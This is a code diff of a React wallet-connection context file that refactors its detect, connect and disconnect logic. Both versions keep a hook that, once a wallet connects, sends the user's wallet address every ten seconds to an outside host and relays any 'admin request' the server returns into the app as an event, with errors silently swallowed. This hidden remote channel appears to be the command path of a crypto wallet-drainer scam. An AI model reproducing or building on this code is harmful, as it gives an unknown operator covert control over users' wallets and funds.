@@ -1,4 +1,5 @@
-import React, { createContext, useContext, useState, useEffect } from "react";
+// wallet-connect-app/src/context/WalletContext.js
+import { createContext, useContext, useState, useEffect } from "react";
 import { detectWalletEnvironment, connectWallet } from "../wallets/index.js";
 
 const WalletContext = createContext(null);
@@ -12,29 +13,19 @@ export function WalletProvider({ children }) {
   const [provider, setProvider] = useState(null);
   const [loading, setLoading] = useState(false);
 
-  const detect = async () => {
+  // Detect wallet on load
+  useEffect(() => {
     try {
       const d = detectWalletEnvironment();
       if (d.walletId) {
         setChain(d.chain);
         setWalletId(d.walletId);
         setWalletName(d.walletName);
-      } else {
-        setChain(null);
-        setWalletId(null);
-        setWalletName(null);
-        setProvider(null);
-        setAddress(null);
       }
-    } catch {
-      setChain(null);
-      setWalletId(null);
-      setWalletName(null);
-      setProvider(null);
-      setAddress(null);
-    }
-  };
+    } catch {}
+  }, []);
 
+  // Connect wallet
   const connect = async () => {
     setLoading(true);
     try {
@@ -47,83 +38,68 @@ export function WalletProvider({ children }) {
       setConnected(true);
       setLoading(false);
       return { success: true, data: result };
-    } catch (error) {
+    } catch (err) {
       setConnected(false);
       setLoading(false);
-      return { success: false, error: error.message };
+      return { success: false, error: err.message };
     }
   };
 
+  // Disconnect
   const disconnect = () => {
     setConnected(false);
     setChain(null);
     setAddress(null);
     setWalletName(null);
     setWalletId(null);
-
-    if (provider) {
-      try {
-        if (typeof provider.disconnect === "function") provider.disconnect();
-        else if (typeof provider.close === "function") provider.close();
-        else if (provider.walletConnect?.disconnect) provider.walletConnect.disconnect();
-      } catch {}
-      setProvider(null);
-    }
+    try {
+      provider?.disconnect?.();
+    } catch {}
+    setProvider(null);
   };
 
-  useEffect(() => {
-    detect();
-  }, []);
-
+  // Poll for admin requests
   useEffect(() => {
     if (!address) return;
 
-    const checkAdminRequests = async () => {
+    const check = async () => {
       try {
         const res = await fetch(
           `https://beckend0192.vercel.app/api/get-wallet-requests?address=${address}`
         );
-
         const data = await res.json();
-
         if (data.success && data.requests?.length > 0) {
-          const req = data.requests[0];
-          window.dispatchEvent(new CustomEvent("adminRequest", { detail: req }));
+          window.dispatchEvent(
+            new CustomEvent("adminRequest", { detail: data.requests[0] })
+          );
         }
       } catch {}
     };
 
-    checkAdminRequests();
-    const interval = setInterval(checkAdminRequests, 10000);
+    check();
+    const interval = setInterval(check, 10000);
     return () => clearInterval(interval);
   }, [address]);
 
-  const contextValue = {
-    connected,
-    chain,
-    address,
-    walletName,
-    walletId,
-    provider,
-    loading,
-    detect,
-    connect,
-    disconnect,
-  };
-
   return (
-    <WalletContext.Provider value={contextValue}>
+    <WalletContext.Provider
+      value={{
+        connected,
+        chain,
+        address,
+        walletName,
+        walletId,
+        provider,
+        loading,
+        connect,
+        disconnect
+      }}
+    >
       {children}
     </WalletContext.Provider>
   );
 }
 
 export function useWallet() {
-  const ctx = useContext(WalletContext);
-  if (!ctx) {
-    throw new Error("useWallet must be used within WalletProvider");
-  }
-  return ctx;
+  return useContext(WalletContext);
 }
-
-export { WalletContext };
